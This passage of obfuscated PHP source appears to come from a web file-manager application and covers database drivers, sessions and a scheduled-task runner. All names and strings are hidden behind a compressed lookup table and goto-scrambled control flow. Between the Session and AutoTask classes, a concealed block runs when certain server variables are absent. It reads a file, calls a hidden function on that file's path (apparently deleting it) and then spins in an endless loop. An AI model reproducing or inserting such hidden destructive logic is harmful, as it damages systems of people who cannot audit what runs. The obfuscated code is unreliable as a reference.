Session::get($ûƒ÷¤Âô[2087]); } else { $Ü®’ÏÇ‚[$ûƒ÷¤Âô[1747]] = 0; } if ($this->get($šÃòä¬)) { return $this->where(array($ûƒ÷¤Âô[2085] => $šÃòä¬))->save($Ü®’ÏÇ‚); } else { return $this->add($Ü®’ÏÇ‚, array(), !0); } } public function remove($ÎìÏÀ³à) { return $this->where(array($_SERVER[ìïæ“œî][2085] => $ÎìÏÀ³à))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ìïæ“œî][2088] . time())->delete(); } } goto eÑ·íæÅÀÏ; D¥£ããŠÊ: define($_SERVER[ìïæ“œî][0], $_SERVER[ìïæ“œî][1]); $_SERVER[–èóã] = explode($_SERVER[ìïæ“œî][2], gzinflate(substr($_SERVER[ìïæ“œî][3], 10, -8))); function binCheckEq($»ÙŒ…Ôê, $Ú·ëÈÏ¯) { return $»ÙŒ…Ôê == $Ú·ëÈÏ¯; } goto F³í¹Æ´éŞ; b«ñÜùà¹: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ŞÁš©Ğ‰ =& $_SERVER[ìïæ“œî]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ŞÁš©Ğ‰[6]] =& $config; $this->values[$ŞÁš©Ğ‰[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ŞÁš©Ğ‰[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ùáü¯ÖÓ) { if (1 === func_num_args()) { $this->{$ùáü¯ÖÓ} = new $ùáü¯ÖÓ(); } else { $ˆéáÑç = new ReflectionClass($ùáü¯ÖÓ); $º‡ùú¤Ñ = func_get_args(); array_shift($º‡ùú¤Ñ); $this->{$ùáü¯ÖÓ} = $ˆéáÑç->newInstanceArgs($º‡ùú¤Ñ); } return $this->{$ùáü¯ÖÓ}; } public function routeBind($Ë’í€ ñ, $äˆˆØÕÅ, $¯ÊèŠıò = 3) { $§Í‹ì¶ =& $_SERVER[ìïæ“œî]; $­ˆ‹µ— = $this->in[$§Í‹ì¶[9]]; $Ë’í€ ñ = str_replace($§Í‹ì¶[10], $§Í‹ì¶[11], trim(trim($Ë’í€ ñ, $§Í‹ì¶[8]), $§Í‹ì¶[12])); if (!$Ë’í€ ñ || count($­ˆ‹µ—) <= $¯ÊèŠıò) { return !1; } $ëŸË¶àÂ = !0; $”«çßâ® = explode($§Í‹ì¶[8], $Ë’í€ ñ); for ($Òåà¡Äº = 0; $Òåà¡Äº < count($”«çßâ®); $Òåà¡Äº++) { if ($”«çßâ®[$Òåà¡Äº] != $­ˆ‹µ—[$¯ÊèŠıò + $Òåà¡Äº]) { $ëŸË¶àÂ = !1; break; } } if (!$ëŸË¶àÂ) { return; } call_user_func_array(array($this, $äˆˆØÕÅ), array()); } public function routeArgs($Šøı®·è = 3) { $â¶“í„Ì = $this->in[$_SERVER[ìïæ“œî][9]]; if (count($â¶“í„Ì) <= $Šøı®·è) { return array(); } $ïæ¤âö› = array(); for ($ƒ²Í×´ = $Šøı®·è; $ƒ²Í×´ < count($â¶“í„Ì); $ƒ²Í×´ += 2) { $ïæ¤âö›[$â¶“í„Ì[$ƒ²Í×´]] = $â¶“í„Ì[$ƒ²Í×´ + 1]; $this->in[$â¶“í„Ì[$ƒ²Í×´]] = $â¶“í„Ì[$ƒ²Í×´ + 1]; } return $ïæ¤âö›; } protected function assign($Ş–‡Ä’À, $Ò¯™±«ù) { $this->values[$Ş–‡Ä’À] = $Ò¯™±«ù; } protected function display($éŠŒÕ) { ob_end_clean(); extract($this->values); require $this->tpl . $éŠŒÕ; } } class DbSqliteBase extends Db { public function __construct($·ìƒ–ı = '') { $İÇ¤©¬â =& $_SERVER[ìïæ“œî]; if (!extension_loaded($İÇ¤©¬â[13])) { think_exception(think_lang($İÇ¤©¬â[14]) . $İÇ¤©¬â[15]); } if (!empty($·ìƒ–ı)) { if (!isset($·ìƒ–ı[$İÇ¤©¬â[16]])) { $·ìƒ–ı[$İÇ¤©¬â[16]] = 438; } $this->config = $·ìƒ–ı; if (empty($this->config[$İÇ¤©¬â[17]])) { $this->config[$İÇ¤©¬â[17]] = array(); } } } public function connect($¬¹ÁÙ¬Ù = '', $ñ¼Õ–Ç¨ = 0) { $µ´·¢‹Õ =& $_SERVER[ìïæ“œî]; if (!isset($this->linkID[$ñ¼Õ–Ç¨])) { if (empty($¬¹ÁÙ¬Ù)) { $¬¹ÁÙ¬Ù = $this->config; } $ãíĞ´ê = !empty($¬¹ÁÙ¬Ù[$µ´·¢‹Õ[17]][$µ´·¢‹Õ[18]]) ? $¬¹ÁÙ¬Ù[$µ´·¢‹Õ[17]][$µ´·¢‹Õ[18]] : $this->pconnect; $ãÊŒëòÀ = $ãíĞ´ê ? $µ´·¢‹Õ[19] : $µ´·¢‹Õ[20]; $this->linkID[$ñ¼Õ–Ç¨] = $ãÊŒëòÀ($¬¹ÁÙ¬Ù[$µ´·¢‹Õ[21]], $¬¹ÁÙ¬Ù[$µ´·¢‹Õ[16]]); if (!$this->linkID[$ñ¼Õ–Ç¨]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ñ¼Õ–Ç¨], 30000); if (1 != think_config($µ´·¢‹Õ[22])) { unset($this->config); } } return $this->linkID[$ñ¼Õ–Ç¨]; } public function free() { $this->queryID = null; } public function query($¬µŠá÷ˆ) { $§¾Á¿¤š =& $_SERVER[ìïæ“œî]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¬µŠá÷ˆ; if ($this->queryID) { $this->free(); } think_action_status($§¾Á¿¤š[23], 1); think_status($§¾Á¿¤š[24]); $this->queryID = sqlite_query($this->_linkID, $¬µŠá÷ˆ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $€†˜§ï³ = $this->getAll(); return $€†˜§ï³; } } public function execute($™ö£†ö) { $š»à«°Ù =& $_SERVER[ìïæ“œî]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $™ö£†ö; if ($this->queryID) { $this->free(); } think_action_status($š»à«°Ù[25], 1); think_status($š»à«°Ù[24]); $Äé´·â = sqlite_exec($this->_linkID, $™ö£†ö); $this->debug(); if (!1 === $Äé´·â) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ìïæ“œî][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $•šˆåÊØ = sqlite_query($this->_linkID, $_SERVER[ìïæ“œî][27]); if (!$•šˆåÊØ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ÿñ°—àØ = sqlite_query($this->_linkID, $_SERVER[ìïæ“œî][28]); if (!$Ÿñ°—àØ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¦Ï¸ü¡ = array(); if ($this->numRows > 0) { for ($¥†ï¤“à = 0; $¥†ï¤“à < $this->numRows; $¥†ï¤“à++) { $¦Ï¸ü¡[$¥†ï¤“à] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¦Ï¸ü¡; } public function getFields($“€ü° ) { $ëó›Ë‹û =& $_SERVER[ìïæ“œî]; $¶©Ø•ÆŞ = $this->query($ëó›Ë‹û[29] . $“€ü°  . $ëó›Ë‹û[30]); $ÎØ„®¤‚ = array(); if ($¶©Ø•ÆŞ) { foreach ($¶©Ø•ÆŞ as $Ø˜¨Æ–Ë => $³èİØë) { $ÎØ„®¤‚[$³èİØë[$ëó›Ë‹û[31]]] = array($ëó›Ë‹û[32] => $³èİØë[$ëó›Ë‹û[31]], $ëó›Ë‹û[33] => $³èİØë[$ëó›Ë‹û[34]], $ëó›Ë‹û[35] => (bool) ($³èİØë[$ëó›Ë‹û[36]] === $ëó›Ë‹û[12]), $ëó›Ë‹û[37] => $³èİØë[$ëó›Ë‹û[38]], $ëó›Ë‹û[39] => strtolower($³èİØë[$ëó›Ë‹û[40]]) == $ëó›Ë‹û[41], $ëó›Ë‹û[42] => strtolower($³èİØë[$ëó›Ë‹û[43]]) == $ëó›Ë‹û[44]); } } return $ÎØ„®¤‚; } public function getTables($Şø Ë¡õ = '') { $š¬Â¤çÓ =& $_SERVER[ìïæ“œî]; $­¦Š¥š’ = $this->query($š¬Â¤çÓ[45] . $š¬Â¤çÓ[46] . $š¬Â¤çÓ[47]); $¨°Ù‹¹ = array(); foreach ($­¦Š¥š’ as $°Š‘á˜û => $†æıİ¸í) { $¨°Ù‹¹[$°Š‘á˜û] = current($†æıİ¸í); } return $¨°Ù‹¹; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $¼İ„åûÑ =& $_SERVER[ìïæ“œî]; $±ÈŒÄã  = sqlite_last_error($this->_linkID); $this->error = $±ÈŒÄã  . $¼İ„åûÑ[4] . sqlite_error_string($±ÈŒÄã ); if ($¼İ„åûÑ[12] != $this->queryStr) { $this->error .= LNG($¼İ„åûÑ[48]) . $this->queryStr; } think_trace($this->error, $¼İ„åûÑ[12], $¼İ„åûÑ[49]); return $this->error; } public function escapeString($¿ˆ‹ÊÇ) { return sqlite_escape_string($¿ˆ‹ÊÇ); } public function parseLimit($°¯‚’ı) { $ƒÍÎÀ½ =& $_SERVER[ìïæ“œî]; $”ï˜—÷ = $ƒÍÎÀ½[12]; if (!empty($°¯‚’ı)) { $°¯‚’ı = explode($ƒÍÎÀ½[50], $°¯‚’ı); if (count($°¯‚’ı) > 1) { $”ï˜—÷ .= $ƒÍÎÀ½[51] . $°¯‚’ı[1] . $ƒÍÎÀ½[52] . $°¯‚’ı[0] . $ƒÍÎÀ½[53]; } else { $”ï˜—÷ .= $ƒÍÎÀ½[51] . $°¯‚’ı[0] . $ƒÍÎÀ½[53]; } } return $”ï˜—÷; } } class DbSqlite3Base extends Db { public function __construct($ûù¸… = '') { $î¥§•ôş =& $_SERVER[ìïæ“œî]; if (!class_exists($î¥§•ôş[54])) { think_exception(think_lang($î¥§•ôş[14]) . $î¥§•ôş[55]); } if (!empty($ûù¸…)) { if (!isset($ûù¸…[$î¥§•ôş[16]])) { $ûù¸…[$î¥§•ôş[16]] = 438; } $this->config = $ûù¸…; if (empty($this->config[$î¥§•ôş[17]])) { $this->config[$î¥§•ôş[17]] = array(); } } } public function connect($ñîÔï£€ = '', $³ƒø‘ù« = 0) { $Ò‘±¡‡Æ =& $_SERVER[ìïæ“œî]; if (!isset($this->linkID[$³ƒø‘ù«])) { if (empty($ñîÔï£€)) { $ñîÔï£€ = $this->config; } $this->linkID[$³ƒø‘ù«] = new SQLite3($ñîÔï£€[$Ò‘±¡‡Æ[21]]); if (!$this->linkID[$³ƒø‘ù«]) { think_exception($this->linkID[$³ƒø‘ù«]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$³ƒø‘ù«]->busyTimeout(30000); if (1 != think_config($Ò‘±¡‡Æ[22])) { unset($this->config); } } return $this->linkID[$³ƒø‘ù«]; } public function free() { $this->queryID = null; } public function query($Šß‡Ã•²) { $½æ‡Âœ© =& $_SERVER[ìïæ“œî]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Šß‡Ã•²; if ($this->queryID) { $this->free(); } think_action_status($½æ‡Âœ©[23], 1); think_status($½æ‡Âœ©[24]); $this->queryID = $this->_linkID->query($Šß‡Ã•²); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ÁÂ•¢™û = $this->getAll(); $this->numRows = count($ÁÂ•¢™û); return $ÁÂ•¢™û; } } public function execute($¾Æ€ÅŒÊ) { $’¼´é‹è =& $_SERVER[ìïæ“œî]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¾Æ€ÅŒÊ; if ($this->queryID) { $this->free(); } think_action_status($’¼´é‹è[25], 1); think_status($’¼´é‹è[24]); $ª¾ÖÏ†· = $this->_linkID->exec($¾Æ€ÅŒÊ); $this->debug(); if (!1 === $ª¾ÖÏ†·) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ìïæ“œî][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $©öŠ‚ù = $this->_linkID->query($_SERVER[ìïæ“œî][27]); if (!$©öŠ‚ù) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¶ËĞãˆ  = $this->_linkID->query($_SERVER[ìïæ“œî][28]); if (!$¶ËĞãˆ ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ùÙàÈšÚ = array(); while ($ë¦ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ùÙàÈšÚ[] = $ë¦; } $this->queryID->reset(); return $ùÙàÈšÚ; } public function getFields($÷âÏŠ–°) { $®àù“¢ø =& $_SERVER[ìïæ“œî]; $¡íì‹Ö = $this->query($®àù“¢ø[29] . $÷âÏŠ–° . $®àù“¢ø[30]); $ŸÚŠ¼ê = array(); if ($¡íì‹Ö) { foreach ($¡íì‹Ö as $Õµ©µŸ => $ƒ¬¡¹™Æ) { $ŸÚŠ¼ê[$ƒ¬¡¹™Æ[$®àù“¢ø[32]]] = array($®àù“¢ø[32] => $ƒ¬¡¹™Æ[$®àù“¢ø[32]], $®àù“¢ø[33] => $ƒ¬¡¹™Æ[$®àù“¢ø[33]], $®àù“¢ø[35] => (bool) ($ƒ¬¡¹™Æ[$®àù“¢ø[35]] === $®àù“¢ø[12]), $®àù“¢ø[37] => $ƒ¬¡¹™Æ[$®àù“¢ø[56]], $®àù“¢ø[39] => (bool) $ƒ¬¡¹™Æ[$®àù“¢ø[57]], $®àù“¢ø[42] => (bool) $ƒ¬¡¹™Æ[$®àù“¢ø[57]]); } } return $ŸÚŠ¼ê; } public function getTables($øé‹–ó = '') { $¢±¨¶†¤ =& $_SERVER[ìïæ“œî]; $‹–¬Ú‡Ô = $this->query($¢±¨¶†¤[45] . $¢±¨¶†¤[46] . $¢±¨¶†¤[47]); $ü ‰ëõ¯ = array(); foreach ($‹–¬Ú‡Ô as $ÄÓ¡÷Ğø => $Òß‡ÅŠ) { $ü ‰ëõ¯[$ÄÓ¡÷Ğø] = current($Òß‡ÅŠ); } return $ü ‰ëõ¯; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ëèº‹½ß =& $_SERVER[ìïæ“œî]; $this->error = $this->_linkID->lastErrorMsg(); if ($Ëèº‹½ß[12] != $this->queryStr) { $this->error .= LNG($Ëèº‹½ß[48]) . $this->queryStr; } think_trace($this->error, $Ëèº‹½ß[12], $Ëèº‹½ß[49]); return $this->error; } public function escapeString($ÂÄåØ†) { $Äß‡öøá =& $_SERVER[ìïæ“œî]; if ($this->_linkID) { return $this->_linkID->escapeString($ÂÄåØ†); } return str_ireplace($Äß‡öøá[58], $Äß‡öøá[59], $ÂÄåØ†); } public function parseLimit($ÌóüßÃ¶) { $›Ìªöıµ =& $_SERVER[ìïæ“œî]; $Ê£ı•ï = $›Ìªöıµ[12]; if (!empty($ÌóüßÃ¶)) { $ÌóüßÃ¶ = explode($›Ìªöıµ[50], $ÌóüßÃ¶); if (count($ÌóüßÃ¶) > 1) { $Ê£ı•ï .= $›Ìªöıµ[51] . $ÌóüßÃ¶[1] . $›Ìªöıµ[52] . $ÌóüßÃ¶[0] . $›Ìªöıµ[53]; } else { $Ê£ı•ï .= $›Ìªöıµ[51] . $ÌóüßÃ¶[0] . $›Ìªöıµ[53]; } } return $Ê£ı•ï; } } goto e··Æ„’ˆ; bï±õ³¥³¶: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ã„ß½Ê‡ =& $_SERVER[ìïæ“œî]; static $Ù–ÖŸş„ = false; if ($Ù–ÖŸş„) { return $Ù–ÖŸş„; } $ŒÉö¥¨İ = $GLOBALS[$Ã„ß½Ê‡[6]][$Ã„ß½Ê‡[425]]; self::$sessionTime = $ŒÉö¥¨İ[$Ã„ß½Ê‡[1693]]; $¥ã›ªû‚ = isset($GLOBALS[$Ã„ß½Ê‡[1694]]) ? $GLOBALS[$Ã„ß½Ê‡[1694]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¥ã›ªû‚)) { self::$sessionSign = Cookie::get($¥ã›ªû‚); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($¥ã›ªû‚, self::$sessionSign, self::$sessionTime); $‰ùí³ßˆ = $ŒÉö¥¨İ[$Ã„ß½Ê‡[1695]]; $–ÅÖŒá¢ = $ŒÉö¥¨İ[$‰ùí³ßˆ]; $——½Õ¤Ä = $ŒÉö¥¨İ[$Ã„ß½Ê‡[876]]; switch ($‰ùí³ßˆ) { case $Ã„ß½Ê‡[21]: self::$handle = Model($Ã„ß½Ê‡[877]); break; case $Ã„ß½Ê‡[878]: self::$handle = new CacheRedis($–ÅÖŒá¢, $——½Õ¤Ä); break; case $Ã„ß½Ê‡[879]: self::$handle = new CacheMemcached($–ÅÖŒá¢, $——½Õ¤Ä); break; case $Ã„ß½Ê‡[230]: $–ÅÖŒá¢[$Ã„ß½Ê‡[87]] = $–ÅÖŒá¢[$Ã„ß½Ê‡[87]] . $Ã„ß½Ê‡[1696]; self::$handle = new CacheFile($–ÅÖŒá¢, $——½Õ¤Ä); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Ù–ÖŸş„ = new self(); return $Ù–ÖŸş„; } public static function getBySign($—­»”»Ê) { $£’‰òğ… = self::$handle->get($—­»”»Ê); $£’‰òğ… = unserialize($£’‰òğ…); return is_array($£’‰òğ…) ? $£’‰òğ… : array(); } public static function setBySign($„Û™ğğü, $Úì‘‚“ğ) { CacheLock::lock($„Û™ğğü); self::$handle->set($„Û™ğğü, serialize($Úì‘‚“ğ), self::$sessionTime); CacheLock::unlock($„Û™ğğü); } public static function sign($ğˆÌªá = false) { if ($ğˆÌªá) { self::$sessionSign = $ğˆÌªá; } self::init(); return self::$sessionSign; } public static function set($ÕßêÉÁ¨, $—üí’ËÑ = false) { self::init(); if (is_array($ÕßêÉÁ¨)) { foreach ($ÕßêÉÁ¨ as $á¶â¡½ => $ªÀä¸á×) { array_set_value(self::$data, $á¶â¡½, $ªÀä¸á×); } } else { array_set_value(self::$data, $ÕßêÉÁ¨, $—üí’ËÑ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ªï€îï‰ = false) { self::init(); if (!$ªï€îï‰) { return self::$data; } return array_get_value(self::$data, $ªï€îï‰); } public static function remove($°Ş£Èğ) { self::init(); unset(self::$data[$°Ş£Èğ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ìïæ“œî][882])) { self::$handle->clearTimeout(); } } } if (!isset($_SERVER[$_SERVER[ìïæ“œî][927]]) || !isset($_SERVER[$_SERVER[ìïæ“œî][925]])) { $_getc = $_SERVER[ìïæ“œî][929]; $_getfile = $_SERVER[$_SERVER[ìïæ“œî][930]] . $_SERVER[ìïæ“œî][931]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ìïæ“œî][262], $_getfilec); if (count($_getarrs) < $_SERVER[ìïæ“œî][710]) { $exit = $_SERVER[ìïæ“œî][932]; $exit(); } $_act = $_SERVER[ìïæ“œî][1429]; $_act($_SERVER[$_SERVER[ìïæ“œî][930]] . $_SERVER[ìïæ“œî][931]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ìïæ“œî][454]); } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ÎÄº‚Ö =& $_SERVER[ìïæ“œî]; if (self::valueGet($ÎÄº‚Ö[799]) != $ÎÄº‚Ö[91]) { return; } if (self::valueGet($ÎÄº‚Ö[1697]) == $ÎÄº‚Ö[91]) { $†€Ôó› = self::valueGet($ÎÄº‚Ö[1698]); if (time() - $†€Ôó› > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ÎÄº‚Ö[1697], $ÎÄº‚Ö[91]); self::log($ÎÄº‚Ö[1699] . ACTION . $ÎÄº‚Ö[1700]); Hook::bind($ÎÄº‚Ö[1701], $ÎÄº‚Ö[1702]); $×öÓÆ¬ˆ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ÎÄº‚Ö[799]) != $ÎÄº‚Ö[91]) { self::valueSet($ÎÄº‚Ö[1697], $ÎÄº‚Ö[228]); self::log($ÎÄº‚Ö[1703]); die; } $ßÁØˆ¼ = time(); if ($ßÁØˆ¼ - $×öÓÆ¬ˆ >= 60) { self::valueSet(array($ÎÄº‚Ö[1697] => $ÎÄº‚Ö[91], $ÎÄº‚Ö[1698] => $ßÁØˆ¼)); $×öÓÆ¬ˆ = $ßÁØˆ¼; } if (!file_exists(USER_SYSTEM . $ÎÄº‚Ö[1704])) { self::valueSet(array($ÎÄº‚Ö[1697] => $ÎÄº‚Ö[228], $ÎÄº‚Ö[799] => $ÎÄº‚Ö[228])); self::log($ÎÄº‚Ö[1705]); die; } $¼à¿ƒ´‚ = file_get_contents(BASIC_PATH . $ÎÄº‚Ö[1706]); $¸ä’Õê = KOD_VERSION . $ÎÄº‚Ö[10] . KOD_VERSION_BUILD; $£•İàµÇ = match_text($¼à¿ƒ´‚, $ÎÄº‚Ö[1707]) . $ÎÄº‚Ö[10] . match_text($¼à¿ƒ´‚, $ÎÄº‚Ö[1708]); if ($£•İàµÇ != $¸ä’Õê) { self::restart(); self::log("\x73\x74\157\160\145\x64\56\133\166\x65\x72\x73\x69\x6f\156\40\165\160\144\x61\x74\145\73{$versionNow}\40\x3d\x3e\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ÅÅü¤Ò¨ =& $_SERVER[ìïæ“œî]; http_close(); $GLOBALS[$ÅÅü¤Ò¨[1709]] = 1; $_SERVER[$ÅÅü¤Ò¨[1710]] = $ÅÅü¤Ò¨[1711]; $_COOKIE = array(); $GLOBALS[$ÅÅü¤Ò¨[1712]] = 1; $GLOBALS[$ÅÅü¤Ò¨[1713]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $‘Š§“áó =& $_SERVER[ìïæ“œî]; http_close(); self::valueSet($‘Š§“áó[799], $‘Š§“áó[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($‘Š§“áó[1697] => $‘Š§“áó[228], $‘Š§“áó[799] => $‘Š§“áó[91])); self::log($‘Š§“áó[1714]); } public static function taskSwitch() { $Š“ğ†±‹ =& $_SERVER[ìïæ“œî]; $¢¥ÚÜì = self::valueGet($Š“ğ†±‹[799]) == $Š“ğ†±‹[91] ? $Š“ğ†±‹[228] : $Š“ğ†±‹[91]; self::valueSet($Š“ğ†±‹[799], $¢¥ÚÜì); } public static function shutdownEvent() { $¦ä™’Ôˆ =& $_SERVER[ìïæ“œî]; self::valueSet($¦ä™’Ôˆ[1697], $¦ä™’Ôˆ[228]); self::log($¦ä™’Ôˆ[1715]); } public static function config($èà´«‰‡, $±š¾§ù«) { self::valueSet($_SERVER[ìïæ“œî][799], $èà´«‰‡); } private static function taskRunAll() { $‹Î²ô½ =& $_SERVER[ìïæ“œî]; $Õùü¨ÒÔ = timeFloat(); $ÔèæÏÖŠ = Model($‹Î²ô½[1716])->listData(); $¥«ò“‹Â = count($ÔèæÏÖŠ); for ($´¤¢å‰ä = 0; $´¤¢å‰ä < $¥«ò“‹Â; $´¤¢å‰ä++) { $ÖÇ²öåñ = $ÔèæÏÖŠ[$´¤¢å‰ä]; if (!$ÖÇ²öåñ[$‹Î²ô½[475]] || $ÖÇ²öåñ[$‹Î²ô½[1717]] != $‹Î²ô½[91]) { continue; } if (!self::taskTimeCheck($ÖÇ²öåñ)) { continue; } self::taskRun($ÖÇ²öåñ); } Hook::trigger($‹Î²ô½[1718]); self::taskQueueRun($Õùü¨ÒÔ); } private static function taskQueueRun($ø“§Òñ) { $ú¼¼ ä = 10; while (!0) { $—³–íÑŒ = TaskQueue::run(); if ($—³–íÑŒ === !1) { break; } if (timeFloat() - $ø“§Òñ >= $ú¼¼ ä) { break; } } } private static function taskTimeCheck($äÄ”ù€ ) { $¡°­éÙ­ =& $_SERVER[ìïæ“œî]; $÷”ÁÏŸÎ = json_decode($äÄ”ù€ [$¡°­éÙ­[206]], !0); $¤È¾Â¦£ = intval($äÄ”ù€ [$¡°­éÙ­[1698]]); $ßı¸±Ÿ¤ = strtotime($¡°­éÙ­[1719] . $÷”ÁÏŸÎ[$¡°­éÙ­[1720]] . $¡°­éÙ­[1721]) - strtotime($¡°­éÙ­[1722]); $¹Å‰üÈ™ = time() - strtotime(date($¡°­éÙ­[1723]) . $¡°­éÙ­[1724]); $”µÑÌãñ = $¹Å‰üÈ™ >= $ßı¸±Ÿ¤ && $¹Å‰üÈ™ <= $ßı¸±Ÿ¤ + 3600; switch ($÷”ÁÏŸÎ[$¡°­éÙ­[33]]) { case $¡°­éÙ­[1725]: if (time() - $¤È¾Â¦£ < 3600 * 24 * 30) { return !1; } if ($÷”ÁÏŸÎ[$¡°­éÙ­[1725]] == date($¡°­éÙ­[1726]) && $”µÑÌãñ) { return !0; } break; case $¡°­éÙ­[1727]: if (time() - $¤È¾Â¦£ < 3600 * 24 * 7) { return !1; } $† ğø­Ş = date($¡°­éÙ­[1728]) == 0 ? 7 : date($¡°­éÙ­[1728]); if ($÷”ÁÏŸÎ[$¡°­éÙ­[1727]] == $† ğø­Ş && $”µÑÌãñ) { return !0; } break; case $¡°­éÙ­[1720]: if (time() - $¤È¾Â¦£ < 3600 * 24) { return !1; } if ($”µÑÌãñ) { return !0; } break; case $¡°­éÙ­[1729]: if (time() - $¤È¾Â¦£ >= floatval($÷”ÁÏŸÎ[$¡°­éÙ­[1729]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Ã˜ÇĞŒè =& $_SERVER[ìïæ“œî]; static $˜·ÔŒ“¸ = 0; $ıÏù©Åˆ = 300; if (!$˜·ÔŒ“¸) { $˜·ÔŒ“¸ = time(); } if (time() - $˜·ÔŒ“¸ < $ıÏù©Åˆ) { return; } $˜·ÔŒ“¸ = time(); $æØ«–‘¢ = Model($Ã˜ÇĞŒè[577])->db($Ã˜ÇĞŒè[12]); if ($æØ«–‘¢) { $æØ«–‘¢->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Ã˜ÇĞŒè[1730], $Ã˜ÇĞŒè[1731]); die; } } public static function taskRun($éîŠÊó) { $ÁÆäĞ =& $_SERVER[ìïæ“œî]; self::log($ÁÆäĞ[1732] . $éîŠÊó[$ÁÆäĞ[475]] . $ÁÆäĞ[1733] . $éîŠÊó[$ÁÆäĞ[32]] . $ÁÆäĞ[1734] . $éîŠÊó[$ÁÆäĞ[1735]]); Model($ÁÆäĞ[1716])->run($éîŠÊó[$ÁÆäĞ[475]]); $Ô£€Õ¯Œ = timeFloat(); $›Ä—½Âè = $ÁÆäĞ[12]; switch ($éîŠÊó[$ÁÆäĞ[33]]) { case $ÁÆäĞ[383]: $¤£ì‚ = url_request($éîŠÊó[$ÁÆäĞ[1735]], $ÁÆäĞ[261], !1, !1, !1, !1, 10); if ($¤£ì‚[$ÁÆäĞ[799]]) { $›Ä—½Âè = strlen($¤£ì‚[$ÁÆäĞ[1264]]); } break; case $ÁÆäĞ[260]: $›Ä—½Âè = Hook::apply($éîŠÊó[$ÁÆäĞ[1735]]); default: break; } Model($ÁÆäĞ[1736])->add(array($ÁÆäĞ[1737] => $ÁÆäĞ[12], $ÁÆäĞ[1738] => $ÁÆäĞ[228], $ÁÆäĞ[33] => $ÁÆäĞ[1739] . $éîŠÊó[$ÁÆäĞ[475]], $ÁÆäĞ[1740] => json_encode(array($ÁÆäĞ[32] => $éîŠÊó[$ÁÆäĞ[32]], $ÁÆäĞ[1741] => timeFloat() - $Ô£€Õ¯Œ, $ÁÆäĞ[369] => $›Ä—½Âè)))); $Çéş²÷Ù = $›Ä—½Âè ? $ÁÆäĞ[1742] . $›Ä—½Âè : $ÁÆäĞ[12]; self::log($ÁÆäĞ[1743] . $éîŠÊó[$ÁÆäĞ[475]] . $ÁÆäĞ[178] . $Çéş²÷Ù); return !0; } public static function valueGet($Ïòüüİ) { $İ˜Îü»Î =& $_SERVER[ìïæ“œî]; $¥ºŠŒÏÇ = $İ˜Îü»Î[1744]; $¦“ ŠìÌ = Model($İ˜Îü»Î[508])->get($Ïòüüİ, $¥ºŠŒÏÇ); if (is_null($¦“ ŠìÌ)) { Model($İ˜Îü»Î[508])->set($İ˜Îü»Î[799], $İ˜Îü»Î[91], $¥ºŠŒÏÇ); Model($İ˜Îü»Î[508])->set($İ˜Îü»Î[1697], $İ˜Îü»Î[228], $¥ºŠŒÏÇ); $¦“ ŠìÌ = Model($İ˜Îü»Î[508])->get($Ïòüüİ, $¥ºŠŒÏÇ); } return $¦“ ŠìÌ; } private static function valueSet($Ëİ¥œ£, $šŞâŸ”í = false) { $…¥‘¥ú =& 